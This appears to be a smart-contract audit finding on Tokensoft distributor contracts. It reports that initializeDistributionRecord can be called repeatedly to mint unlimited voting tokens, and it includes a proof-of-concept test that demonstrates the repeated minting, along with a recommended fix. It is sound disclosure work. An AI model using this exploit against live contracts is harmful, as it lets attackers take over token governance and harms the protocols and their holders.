# Distribution records can be initialised repeatedly to gain infinite voting power

## Summary
All distributor contracts (except BasicDistributor) have `initializeDistributionRecord` function which can be invoked repeatedly to mint infinite ERC20Votes tokens. 

## Vulnerability Detail
The `initializeDistributionRecord` invokes the internal `AdvancedDistributor._initializeDistributionRecord` function which mints the `Internal vote tracker` voting tokens to beneficiary. This minted amount gives the beneficiary a right to vote (on external protocols).

```solidity
  function _initializeDistributionRecord(
    address beneficiary,
    uint256 totalAmount
  ) internal virtual override {
    super._initializeDistributionRecord(beneficiary, totalAmount);

    // add voting power through ERC20Votes extension
    _mint(beneficiary, tokensToVotes(totalAmount));
  }
```
The external `initializeDistributionRecord` of Distributor contracts (for eg, ContinuousVestingMerkle) can be invoked repeatedly to mint infinite (uint256.max) voting tokens.

### POC
This test case was added in `continuousVestingMerkle.test.ts`:
```javascript
  it.only("Bug: Claimers can mint infinite minting tokens", async () => {
    const user = eligible2
    const distributor = partiallyVestedDistributor
    const [index, beneficiary, amount] = config.proof.claims[user.address].data.map(d => d.value)
    const proof = config.proof.claims[user.address].proof

    expect((await distributor.balanceOf(beneficiary)).toBigInt(),).toEqual(0n)

    // initialize once
    await distributor.initializeDistributionRecord(index, beneficiary, amount, proof)
    expect((await distributor.balanceOf(beneficiary)).toBigInt(),).toEqual(5000000000000000000000n)

    // initialize multiple times
    await distributor.initializeDistributionRecord(index, beneficiary, amount, proof)
    expect((await distributor.balanceOf(beneficiary)).toBigInt(),).toEqual(10000000000000000000000n)

    await distributor.initializeDistributionRecord(index, beneficiary, amount, proof)
    expect((await distributor.balanceOf(beneficiary)).toBigInt(),).toEqual(15000000000000000000000n)
  })
```

## Impact
The Tokensoft cross chain airdrop protocol is meant to be a build-on-top protocol which will be used by other protocols to launch their airdrops. Attacker can exploit this bug to gain instant unlimited voting rights of those airdropping tokens and influence governance.

The attack is very easy to perform and has high impact.

## Tool used

Manual Review

## Recommendation
Consider implementing a mechanism by which noone can invoke the `initializeDistributionRecord` external function twice.
